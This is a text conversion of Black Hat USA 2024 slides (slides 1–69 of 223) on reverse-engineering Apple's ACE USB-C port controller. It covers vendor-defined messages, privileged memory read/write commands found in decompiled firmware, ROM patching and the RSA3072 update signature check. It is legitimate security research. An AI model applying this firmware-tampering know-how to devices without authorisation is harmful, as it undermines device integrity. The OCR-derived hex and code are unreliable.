---
title: "ACE Up the Sleeve Hacking Into Apple's New USB-C Controller"
speakers: ["Thomas Roth"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Thomas Roth_ACE Up the Sleeve Hacking Into Apple's New USB-C Controller.pdf"
pages: 223
sha256: "edfc9e3233e1ca8c9cd32a0231842004c81162a95dca993d5c6e2edad84c9abf"
text_chars: 47497
ocr_pages: 39
has_ocr: true
redacted_secrets: 0
ocr_confidence: 80.8
ocr_unreliable_blocks: 3
vision_verified_blocks: 21
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:47:02Z"
---
# ACE Up the Sleeve Hacking Into Apple's New USB-C Controller

**Speakers:** Thomas Roth  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Thomas Roth_ACE Up the Sleeve Hacking Into Apple's New USB-C Controller.pdf` (223 pages)


## Slide 1

ACE up the Sleeve Hacking into Apple's new USB-C controller

## Slide 2

###### whoami

###### Thomas Roth aka stacksmashing

Security researcher - Hardware & Firmware Co-founder at hextree.io

Twitter: @ghidraninja YouTube: @stacksmashing

**hextree** .io

## Slide 3

###### Thanks

Carlo Maragno Marc Zyngier (maz) T8012 Dev Team

Siguza Carlo Maragno Marc Zyngier (maz) Oly (Thunderbolt Patcher) T8012 Dev Team AsahiLinux Team aunali1 Carlo Maragno h0m3us3r Jiska, Fabian & Caro mrarm Rick Mark

**hextree** .io

## Slide 4

###### The backstory…

**hextree** .io

## Slide 5

**hextree** .io

## Slide 6

**hextree** .io

## Slide 7

###### The obvious stuff

###### Charging USB Video & Audio

**hextree** .io

## Slide 8

###### The obvious stuff The cool stuff

###### Charging USB

Video & Audio

JTAG UART SDQ

**hextree** .io

## Slide 9

###### The cool stuff

###### Tamarin Cable

###### JTAG UART SDQ

**hextree** .io

## Slide 10

## Slide 11

**hextree** .io

## Slide 12

###### **The cool stuff?**

**hextree** .io

## Slide 13

**hextree** .io

## Slide 14

**hextree** .io

## Slide 15

**hextree** .io

## Slide 16

**hextree** .io

## Slide 17

###### USB-PD Negotiation

**hextree** .io

## Slide 18

###### USB-PD Negotiation

USB-C Port
Controller

**hextree** .io

## Slide 19

**hextree** .io

## Slide 20

###### Configuration Channel

**hextree** .io

## Slide 21

All handled by the USB-C Port (Micro)controller Configuration Channel

**hextree** .io

## Slide 22

Photo by h0m3us3r Thanks T8012 Dev Team! **hextree** .io

## Slide 23

**hextree** .io


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
https://blog.t8012.dev/ace-part-1/
30 captures
) Dee 2020 - 23 Oct 20. ¥ About this capture
The T2 Development
Home Blo Contact Store
Blog 9 oy
USB-PD
ACE: Apple Type-C Port
Controller Secrets | Part 1
Exposing Apple's Vendor Defined Messaging protocol, AppleVDM, built on USB-
PD.
```

## Slide 24

## VDM

**hextree** .io

## Slide 25

## VDM Vendor Defined Messages

**hextree** .io

## Slide 26

## VDM Vendor Defined Messages

**hextree** .io


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vendor Defined Messages
Sort By: |S@areh Rank Page Order Found on 46 pages {< | >} [Done
6.4.4 Vendor Defined Message
The Vendor_Defined Message (VDM) is provided to allow vendors to exchange information outside of that defined by
this specification.
A Vendor_Defined Message Shall consist of at least one Vendor Data Object, the VDM Header, and May contain up to a
maximum of six additional VDM Objects (VDO).
To ensure vendor uniqueness of Vendor_Defined Messages, all Vendor_Defined Messages Shall contain a Valid USB
Standard or Vendor ID (SVID) allocated by USB-IF in the VDM Header.
Two types of Vendor_Defined Messages are defined: Structured VDMs and Unstructured VDMs. A Structured VDM
defines an extensible structure designed to support Modal Operation. An Unstructured VDM does not define any
structure and Messages May be created in any manner that the vendor chooses.
Vendor_Defined Messages Shall Not be used for direct power negotiation. They May however be used to alter Local
Policy, affecting what is offered or consumed via the normal PD Messages. For example a Vendor_Defined Message ts hextree . {@)
could be used to enable the Source to offer additional power via a Source_Capabilities Message.
```

## Slide 27

## VDM Vendor Defined Messages

**hextree** .io


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
fg web.archive.org
https://blog.t8012.dev/ace-part-1/
30 captures
30 Dec 2020 - 23 Oct 202
Protocol Summary
With the code above available, it is possible to finally sum up how this
protocol works. All messages must come from SOP'DBG or SOP''DBG .
AppleVDM @x1®@ : Get Action List
Input: { @x5AC80@10 }
Reply: Shorts encoded using VDM (first short in high 16 bytes, second in low
16 bytes). Zero terminated.
Example reply VDOs: @5020702 06060206 01060105 02030103
08000000
AppleVDM @x11 : Get Action Info
Parameters:
x
uint16_t ActionId - specifies the action, taken from 0x10 reply
nextree.io
```

## Slide 28

**hextree** .io

## Slide 29

######

######

**hextree** .io

## Slide 30

###### VDM action 0x306

######

**hextree** .io

## Slide 31

**hextree** .io

## Slide 32

**hextree** .io

## Slide 33

## Type-C Port Controller

**hextree** .io

## Slide 34

## Type-C Port Controller

ACE

**hextree** .io

## Slide 35

## Type-C Port Controller

ACE
ACE2
ACE3

**hextree** .io

## Slide 36

## Type-C Port Controller

ACE
System
on
Chip

**hextree** .io

## Slide 37

## Type-C Port Controller

USB & Thunderbolt
ACE
System
on
Chip

**hextree** .io

## Slide 38

## Type-C Port Controller

USB & Thunderbolt
ACE
System
Serial console
on
Chip

**hextree** .io

## Slide 39

## Type-C Port Controller

USB & Thunderbolt
ACE
System
Serial console
on
& more!
Chip

**hextree** .io

## Slide 40

But how can we send VDM?

**hextree** .io

## Slide 41

###### How can we send VDM?

macvdmtool Back-left port of MacBook Pro to get serial etc Central Scrutinizer Hardware tool to get serial console on MacBook

**hextree** .io

## Slide 42

###### Tamarin-C

Allows bi-directional access to internal busses JTAG probe integrated Discovered SPMI on iPhone 15 & M3 Pro/Max

**hextree** .io

## Slide 43

**hextree** .io


> Recovered by OCR — confidence 89/100 on the text kept, 34/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
nks to the Central Scrutin
```

## Slide 44

**hextree** .io

## Slide 45

# The ACE2

**hextree** .io

## Slide 46

###### ACE2

CD3217 - USB-C / PD Controller

Arm-based and connected via I2C Found on MacBooks starting with the T2

**hextree** .io

## Slide 47

**hextree** .io


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
fan)
Page 1 of 111
1
wr Sample &
es Buy
TEXAS
INSTRUMENTS
Tools & Support &
Software Community
TPS65986
R 5
TPS65986 USB Type-C and USB PD Controller and Power Switch
Features
USB Power-Delivery (PD) Controller
— Mode Configuration for Source (Host), Sink
(Device), or Source-Sink
— Bi-Phase Marked Encoding/Decoding (BMC)
— Physical Layer (PHY) Protocol
— Policy Engine
- Configurable at Boot and Host-Controlled
USB Type-C Specification Compliant
— Detect USB Cable-Plug Attach
— Cable Orientation and Role Detection
— Assign CC and VCONN Pins
— Advertise Default, 1.5 A, or 3 A for Type-C
Power
Port Power Switch
— 6, 3-A Switch to VBUS for Type-C Power
- 5-V to 20-V, 3-A Bidirectional Switch to or from
VBUS for USB PD Power
— 5, 600-mA Switches for VCONN
— Overcurrent Limiter, Overvoltage Protector
— Slew-Rate Control
— Hard Reset Support
Port Data Termination
— USB 2.0 Low-Speed Endpoint
Power Management
— Power Supply from 3.3 V or VBUS Source
— 3.3-V LDO Output for Dead Battery Support
BGA MicroStar Junior Package
— 0.5-mm Pitch
3 Description
The TPS65986 device is a stand-alone USB Type-C
and power delivery (PD) controller providing cable-
plug and orientation detection at the USB Type-C
connector. Upon cable detection, the TPS65986
device communicates on the CC wire using the USB
PD protocol. When cable detection and USB PD
negotiation are complete, the TPS65986 device
enables the appropriate power path and configures
alternate mode settings for (optional) extemal
multiplexers.
The mixed-signal front end on the CC pins advertises
default (900 mA), 1.5 A, or 3 A for Type-C power
sources, detects a plug event and determines the
USB Type-C cable orientation, and autonomously
negotiates USB PD contracts by adhering to the
specified bi-phase marked coding (BMC) and
physical layer (PHY) protocol.
The port power switch passes up to 3 A downstream
at 5 V for legacy and Type-C USB power. An
additional bi-directional switch path provides USB PD
power up to 3 A at a maximum of 20 V as either a
source (host), sink (device), or source-sink.
The TPS65986 device is also an upstream-facing port
(UFP). downstream-facing port (DFP), or dual-role
port for data. The port data termination passes data
to or fram the top or bottom D+/D— signal pair to the
USB 2.0 low-speed endpoint The power
management circuitry uses a 3.3-V power supply
inside the system and also uses VBUS to start up
and negotiate power from a dead battery or no
battery condition.
BODY SIZE (NOM)
```

## Slide 48

**hextree** .io

## Slide 49

###### Identified commandhandler

###### Contains "privileged" commands MEMr/MEMw/MEMm

**hextree** .io


> Recovered by OCR — confidence 71/100 on the text kept, 58/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
eee © ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
Peg Types Search types
Name * Size @xz9beB
a ES 00029bec void (* hardler)(int92_t, int32_t) = sub_206c6
@ struct_2 axa pe29bfe [0x41] =
0] System Types: ace_combined.bin.bndb 9p029bfa {
ege29bT4 void (* handler)(int32_t, int32_t) = sub 286c6
00029bfc void (* handler)(int32_t, int32_t) = sub_251«2
a al e r 00029¢88 [0x43] =
struct command_nandler __packed 90029¢00 {
= Contains "privileged Ee
| 88829¢8c void (* handler)(int32_t, int32_t) = handle_memr
00029018 {
CO! ! I ! la al S 000629¢18 char name|@x4] = ‘MENm"
00029¢14 void (* handler)(int32_t, int32_t) = handle_memr
Cross References 2 09029018 char nane|éx4] = ‘ycot”
00029¢24 void (* handler)(int32_t, int32_t) = sub_270€2
00029¢28 }
00029¢28 {
00029c28 char nane|@x4] = ‘CRST"
```

## Slide 50

###### Identified commandhandler

###### Contains "privileged" commands MEMr/MEMw/MEMm

**hextree** .io


> Recovered by OCR — confidence 74/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee © ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
#% Types Q Search types — = Mapped~ Lineary High Level IL ~ Oc = _ (x)
. Pn char name[@x4] = "MEMr" =
m Identified command- 5 void (* handler)(int32_t, int32_t) = handle_memr
char n
voit {
8 };
= Contains "privileged" char name[@x4] = "MEMw"
d void (* handler) (int32_t, int32_t)
commands }
cosrewen LOX45] =
handle_memr
char name[@x4] = "MEMm"
void (* handler) (int32_t, int32_t) = handle_memr =
} bie
®30 &A20 thumb2 0x29a00-0x29a04 (0x4 bytes} a
2)
```

## Slide 51

###### Apple HPM Bus

Internal interface to talk to I2C Used by HPMDiagnose & co Can be used to communicate with ACE

**hextree** .io

## Slide 52

###### FourCC Commands Different registers that can be written/read to/from 4-digit integer/ASCII commands Commands in register 9, Status in 3 acetool - Tool to communicate with ACE

**hextree** .io

## Slide 53

FourCC Commands Different registers that can be written/read to/from 4-digit integer/ASCII commands Commands in register 9, Status in 3 acetool - Tool to communicate with ACE

**hextree** .io

## Slide 54

**hextree** .io

## Slide 55

SPI Flash

**hextree** .io

## Slide 56

Send firmware
via UART

SPI Flash

**hextree** .io

## Slide 57

###### ACE2: SPI Flash

Does not contain full firmware Contains "patches" for the ROM Makes reversing… annoying

SPI Flash

**hextree** .io

## Slide 58

**hextree** .io

## Slide 59

**hextree** .io


> Recovered by OCR — confidence 73/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
@602275a int32_t var_18 = r3
66022766 — char* r5 = *(arg2 + 4)
86822762 void* r6 = nullptr
0022766 — void* r4 = nullptr
8002276e data_2@0443c5 = (zx.d(*r5) << @xle u>> @x1e).b
80022776 *r5 = (zx.d(*r5) << @xlce u>> Oxic).b
| : @08293c8 int32_t r1_1
46822796 uint32_t r@_5 = r2_2 << @x1@ u>> @x18 .
@002279c uint32_t r7 = zx.d(r2_2.b) @00293c8 int32_t r3
@082279e uint32_t r1_2 = zx.d(data_200443c5) c antec. F
880293c8 r@_1, r1_1, r2, r3 = data_286@41894(arg1)
00623606 return sub_e@(r@_1, r1_1, r2, r3)
& hextree.io
```

## Slide 60

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 73/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
0002275a    int32_t var_18 = r3
00022760    char* r5 = *(arg2 + 4)
00022762    void* r6 = nullptr
00022766    void* r4 = nullptr
0002276e    data_200443c5 = (zx.d(*r5) << 0x1e u>> 0x1e).b
00022776    *r5 = (zx.d(*r5) << 0x1c u>> 0x1c).b
00022778    r5[1] = 0
0002277c    sub_293b8(0)
00022788    data_10002008 = data_10002008 & 0xffffffbf
00022792    int32_t r2_2 = data_1000048c
00022796    uint32_t r0_5 = r2_2 << 0x10 u>> 0x18
0002279c    uint32_t r7 = zx.d(r2_2.b)
0002279e    uint32_t r1_2 = zx.d(data_200443c5)

000293b8  int32_t sub_293b8(int32_t arg1)
000293c8    int32_t r0_1
000293c8    int32_t r1_1
000293c8    int32_t r2
000293c8    int32_t r3
000293c8    r0_1, r1_1, r2, r3 = data_20041894(arg1)
00023606    return sub_e0(r0_1, r1_1, r2, r3)

2004188c  void* data_2004188c = sub_21f22
20041890  void* data_20041890 = sub_21f40
20041894  void* data_20041894 = sub_220c0
20041898  void* data_20041898 = sub_22146
2004189c  void* data_2004189c = sub_22186
```

## Slide 61

###### Loaded from flash into RAM

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
0002275a    int32_t var_18 = r3
00022760    char* r5 = *(arg2 + 4)
00022762    void* r6 = nullptr
00022766    void* r4 = nullptr
0002276e    data_200443c5 = (zx.d(*r5) << 0x1e u>> 0x1e).b
00022776    *r5 = (zx.d(*r5) << 0x1c u>> 0x1c).b
00022778    r5[1] = 0
0002277c    sub_293b8(0)
00022788    data_10002008 = data_10002008 & 0xffffffbf
00022792    int32_t r2_2 = data_1000048c
00022796    uint32_t r0_5 = r2_2 << 0x10 u>> 0x18
0002279c    uint32_t r7 = zx.d(r2_2.b)
0002279e    uint32_t r1_2 = zx.d(data_200443c5)

000293b8  int32_t sub_293b8(int32_t arg1)
000293c8    int32_t r0_1
000293c8    int32_t r1_1
000293c8    int32_t r2
000293c8    int32_t r3
000293c8    r0_1, r1_1, r2, r3 = data_20041894(arg1)
00023606    return sub_e0(r0_1, r1_1, r2, r3)

2004188c  void* data_2004188c = sub_21f22
20041890  void* data_20041890 = sub_21f40
Loaded from flash into RAM

20041894  void* data_20041894 = sub_220c0
20041898  void* data_20041898 = sub_22146
2004189c  void* data_2004189c = sub_22186
```

## Slide 62

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 73/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
0002275a    int32_t var_18 = r3
00022760    char* r5 = *(arg2 + 4)
00022762    void* r6 = nullptr
00022766    void* r4 = nullptr
0002276e    data_200443c5 = (zx.d(*r5) << 0x1e u>> 0x1e).b
00022776    *r5 = (zx.d(*r5) << 0x1c u>> 0x1c).b
00022778    r5[1] = 0
0002277c    sub_293b8(0)
00022788    data_10002008 = data_10002008 & 0xffffffbf
00022792    int32_t r2_2 = data_1000048c
00022796    uint32_t r0_5 = r2_2 << 0x10 u>> 0x18
0002279c    uint32_t r7 = zx.d(r2_2.b)
0002279e    uint32_t r1_2 = zx.d(data_200443c5)

000293b8  int32_t sub_293b8(int32_t arg1)
000293c8    int32_t r0_1
000293c8    int32_t r1_1
000293c8    int32_t r2
000293c8    int32_t r3
000293c8    r0_1, r1_1, r2, r3 = data_20041894(arg1)
00023606    return sub_e0(r0_1, r1_1, r2, r3)

2004188c  void* data_2004188c = sub_21f22
20041890  void* data_20041890 = sub_21f40
20041894  void* data_20041894 = sub_220c0
20041898  void* data_20041898 = sub_22146
2004189c  void* data_2004189c = sub_22186
```

## Slide 63

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
int32_t sub_2275a(int32_t arg1, void* arg2)
0002275a    int32_t var_18 = r3
00022760    char* r5 = *(arg2 + 4)
00022762    void* r6 = nullptr
00022766    void* r4 = nullptr
0002276e    data_200443c5 = (zx.d(*r5) << 0x1e u>> 0x1e).b
00022776    *r5 = (zx.d(*r5) << 0x1c u>> 0x1c).b
00022778    r5[1] = 0
0002277c    sub_293b8(0)
00022788    data_10002008 = data_10002008 & 0xffffffbf
00022792    int32_t r2_2 = data_1000048c
00022796    uint32_t r0_5 = r2_2 << 0x10 u>> 0x18
0002279c    uint32_t r7 = zx.d(r2_2.b)
0002279e    uint32_t r1_2 = zx.d(data_200443c5)

000293b8  int32_t sub_293b8(int32_t arg1)
000293c8    int32_t r0_1
000293c8    int32_t r1_1
000293c8    int32_t r2
000293c8    int32_t r3
000293c8    r0_1, r1_1, r2, r3 = data_20041894(arg1)
00023606    return sub_e0(r0_1, r1_1, r2, r3)

000220c0  void sub_220c0(int32_t arg1)

000220ce    if (arg1 == 0)
000220ee        *0x40050018 = 1
000220fa        data_10002008 = data_10002008 | 0x40
00022102        data_10002004 = 0xeabe0001
0002210c        while (data_10002000 << 0x1d s>= 0)
0002210c            nop
00022110            return
000220d2    if (arg1 == 1)
00022112        *0x40050018 = 1
0002211e        data_10002008 = data_10002008 | 0x40
00022126        data_10002004 = 0xeabe0001
00022130        while (data_10002000 << 0x1d s>= 0)
00022130            nop
00022136        data_10002004 = 0xeabe0002
00022140        while (data_10002000 << 0x1c s>= 0)
00022140            nop
00022144        return
000220d6    if (arg1 == 2)
000220da        data_10002004 = 0xeabe0000
000220e4        *0x40050018 = 0

2004188c  void* data_2004188c = sub_21f22
20041890  void* data_20041890 = sub_21f40
20041894  void* data_20041894 = sub_220c0
20041898  void* data_20041898 = sub_22146
2004189c  void* data_2004189c = sub_22186
```

## Slide 64

Can be in ROM or RAM (if patched)

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 65/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Panel: sub_2275a]
int32_t sub_2275a(int32_t arg1, void* arg2)

0002275a    int32_t var_18 = r3
00022760    char* r5 = *(arg2 + 4)
00022762    void* r6 = nullptr
00022766    void* r4 = nullptr
0002276e    data_200443c5 = (zx.d(*r5) << 0x1e u>> 0x1e).b
00022776    *r5 = (zx.d(*r5) << 0x1c u>> 0x1c).b
00022778    r5[1] = 0
0002277c    sub_293b8(0)
00022788    data_10002008 = data_10002008 & 0xffffffbf
00022792    int32_t r2_2 = data_1000048c
00022796    uint32_t r0_5 = r2_2 << 0x10 u>> 0x18
0002279c    uint32_t r7 = zx.d(r2_2.b)
0002279e    uint32_t r1_2 = zx.d(data_200443c5)

[arrow to]

[Panel: sub_293b8]
000293b8    int32_t sub_293b8(int32_t arg1)

000293c8    int32_t r0_1
000293c8    int32_t r1_1
000293c8    int32_t r2
000293c8    int32_t r3
000293c8    r0_1, r1_1, r2, r3 = data_20041894(arg1)
00023606    return sub_e0(r0_1, r1_1, r2, r3)

[arrow down to]

[Panel: function pointer table]
2004188c    void* data_2004188c = sub_21f22
20041890    void* data_20041890 = sub_21f40
20041894    void* data_20041894 = sub_220c0   (highlighted row)
20041898    void* data_20041898 = sub_22146
2004189c    void* data_2004189c = sub_22186

[two arrows point left/down toward the sub_220c0 panel; annotation text next to the arrows:]
"Can be in ROM or RAM (if patched)"

[Panel: sub_220c0]
000220c0    void sub_220c0(int32_t arg1)

000220ce    if (arg1 == 0)
000220ee        *0x40050018 = 1
000220fa        data_10002008 = data_10002008 | 0x40
00022102        data_10002004 = 0xeabe0001
0002210c        while (data_10002000 << 0x1d s>= 0)
0002210c            nop
00022110        return
000220d2    if (arg1 == 1)
00022112        *0x40050018 = 1
0002211e        data_10002008 = data_10002008 | 0x40
00022126        data_10002004 = 0xeabe0001
00022130        while (data_10002000 << 0x1d s>= 0)
00022130            nop
00022136        data_10002004 = 0xeabe0002
00022140        while (data_10002000 << 0x1c s>= 0)
00022140            nop
00022144        return
000220d6    if (arg1 == 2)
000220da        data_10002004 = 0xeabe0000
000220e4        *0x40050018 = 0
```

## Slide 65

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Panel: sub_2275a]
int32_t sub_2275a(int32_t arg1, void* arg2)

0002275a    int32_t var_18 = r3
00022760    char* r5 = *(arg2 + 4)
00022762    void* r6 = nullptr
00022766    void* r4 = nullptr
0002276e    data_200443c5 = (zx.d(*r5) << 0x1e u>> 0x1e).b
00022776    *r5 = (zx.d(*r5) << 0x1c u>> 0x1c).b
00022778    r5[1] = 0
0002277c    sub_293b8(0)
00022788    data_10002008 = data_10002008 & 0xffffffbf
00022792    int32_t r2_2 = data_1000048c
00022796    uint32_t r0_5 = r2_2 << 0x10 u>> 0x18
0002279c    uint32_t r7 = zx.d(r2_2.b)
0002279e    uint32_t r1_2 = zx.d(data_200443c5)

[arrow to]

[Panel: sub_293b8]
000293b8    int32_t sub_293b8(int32_t arg1)

000293c8    int32_t r0_1
000293c8    int32_t r1_1
000293c8    int32_t r2
000293c8    int32_t r3
000293c8    r0_1, r1_1, r2, r3 = data_20041894(arg1)
00023606    return sub_e0(r0_1, r1_1, r2, r3)

[arrow down to]

[Panel: function pointer table]
2004188c    void* data_2004188c = sub_21f22
20041890    void* data_20041890 = sub_21f40
20041894    void* data_20041894 = sub_220c0   (highlighted row)
20041898    void* data_20041898 = sub_22146
2004189c    void* data_2004189c = sub_22186

[arrow points left toward the sub_220c0 panel; no text annotation on this slide]

[Panel: sub_220c0]
000220c0    void sub_220c0(int32_t arg1)

000220ce    if (arg1 == 0)
000220ee        *0x40050018 = 1
000220fa        data_10002008 = data_10002008 | 0x40
00022102        data_10002004 = 0xeabe0001
0002210c        while (data_10002000 << 0x1d s>= 0)
0002210c            nop
00022110        return
000220d2    if (arg1 == 1)
00022112        *0x40050018 = 1
0002211e        data_10002008 = data_10002008 | 0x40
00022126        data_10002004 = 0xeabe0001
00022130        while (data_10002000 << 0x1d s>= 0)
00022130            nop
00022136        data_10002004 = 0xeabe0002
00022140        while (data_10002000 << 0x1c s>= 0)
00022140            nop
00022144        return
000220d6    if (arg1 == 2)
000220da        data_10002004 = 0xeabe0000
000220e4        *0x40050018 = 0

(Verified pixel-identical to slide 64/00135 except this slide omits the "Can be in ROM or RAM (if patched)" annotation and its arrow.)
```

## Slide 66

**hextree** .io


> Recovered by OCR — confidence 75/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
~ Code References
{1}
{1}
{1}
void* data_2084874c =
void* data_20846756 =
void* data_20040754 =
void* data_20848758 =
void* data_2084875c =
void* data_26048766 =
void* data_20040784
void* data_26648788
void* data_26848794
void* data_2064879c
void* data_208487a0
void* data_206467a8
void* data_206467b6
void* data_206467b4
void* data_208487b8
void* data_200487bc
void* data_200487c4
void* data_200487c8
void* data_200467d8
void* data_200487e8
void* data_200467e4
void* data_200487e8
void* data_200407f@
sub_83e
sub_1e2
sub_Sac
sub_3ba
sub_9b4
sub_ida
sub_5d6
sub_76e
sub_1f2
sub_9c8
sub_9e8
sub_71e
sub_664
sub_594
sub_4de
sub_49c
sub_3e6
sub_378
sub_31e
sub_2d6
sub_27¢
sub_236
sub_a@c
sub_a16
sub_a32
sub_a68
sub_a7c
sub_bla
sub_2362
sub_c34
sub_134a
sub_1764
sub_d36
sub_162c
sub_cde
@ hextree.io
```

## Slide 67

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
> ~ sudo usbcfwflasher --verbose
2024-05-08 00:19:13.897 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978] Hardware Present:
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]         RID: 0
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]         UUID: F21A3208-4151-1994-C34D-9FB099F8FB81
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]         Name: USB-C_HPM,28
2024-05-08 00:19:13.899 usbcfwflasher[66217:21870978]         Version: 002.170.00.15
2024-05-08 00:19:13.912 usbcfwflasher[66217:21870978]     OTP Key Hash: 0F C3 8B 26
2024-05-08 00:19:13.912 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.912 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.916 usbcfwflasher[66217:21870978] Updates to be done:
2024-05-08 00:19:13.916 usbcfwflasher[66217:21870978] ---
2024-05-08 00:19:13.916 usbcfwflasher[66217:21870978] {
    0 =     {
        RID = 0;
        options =           {
        };
    };
}
```

## Slide 68

### Updates are protected….

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
> ~ sudo usbcfwflasher --verbose
2024-05-08 00:19:13.897 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978] Hardware Present:
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]         RID: 0
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]         UUID: F21A3208-4151-1994-C34D-9FB099F8FB81
2024-05-08 00:19:13.898 usbcfwflasher[66217:21870978]         Name: USB-C_HPM,28
2024-05-08 00:19:13.899 usbcfwflasher[66217:21870978]         Version: 002.170.00.15
2024-05-08 00:19:13.912 usbcfwflasher[66217:21870978]     OTP Key Hash: 0F C3 8B 26
2024-05-08 00:19:13.912 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.912 usbcfwflasher[66217:21870978]
2024-05-08 00:19:13.916 usbcfwflasher[66217:21870978] Updates to be done:
2024-05-08 00:19:13.916 usbcfwflasher[66217:21870978] ---
2024-05-08 00:19:13.916 usbcfwflasher[66217:21870978] {
    0 =     {
        RID = 0;
        options =           {
        };
    };
}

Updates are protected....
```

## Slide 69

### …with RSA3072

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 72/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Window title bar] ace_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
[Tab] ace_combined.bin.bndb

[Left panel: Symbols, search "rsa"]
Name       Address        Section
rsa3072    0x000008fe4
rsa3072    0x00002515e   (selected)

[Toolbar] Mapped ~   Linear ~   High Level IL ~

int32_t perform_sig_check(char* arg1, int32_t arg2)

00018d2e    maybe_memset_segue(destination: arg1, c: 0, count: 0x40)
00018d32    int32_t r0_10 = data_20043a64
00018d3a    if (r0_10 == 0x140)
00018d3e        data_20043a18 = 6
00018d42    data_20043a64 = r0_10 + 0x40
00018d48    data_20043a5c = data_20043a5c + 1
00018d50    if (zx.d(data_20043a18) != 6)
00018d54        *arg1 = 0x80
00018d5c        arg1[1] = (data_20043a58.w).b + (data_20043a5c.w).b
00018d7c        arg1[2] = 0 | ((zx.d(some_fw_update_struct?!.field_10) + 1) << 0x1e u>> 0x1b).b | (zx.d(some_fw_update_struct?!.f  [line cut off at window edge]
00018d50    else
00018d8a        int32_t var_28_1 = 0
00018d8e        sha256(a1: &data_20043bf4, a2: 0x180, a3: &public_key_hash, a4: 0)
00018d98        load_from_otp(1, &public_key_hash_from_otp, 0x20)
00018da2        int32_t r0_20 = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: 0x20)
00018dae        char* r4_1 = load_from_otp(2, &public_key_hash_from_otp, 0x20)
00018db8        int32_t r0_21 = constant_time_compare(in1: &public_key_hash, in2: &public_key_hash_from_ctp, length: 0x20)
00018dc4        maybe_memset_segue(destination: &public_key_hash, c: 0, count: 0x20)
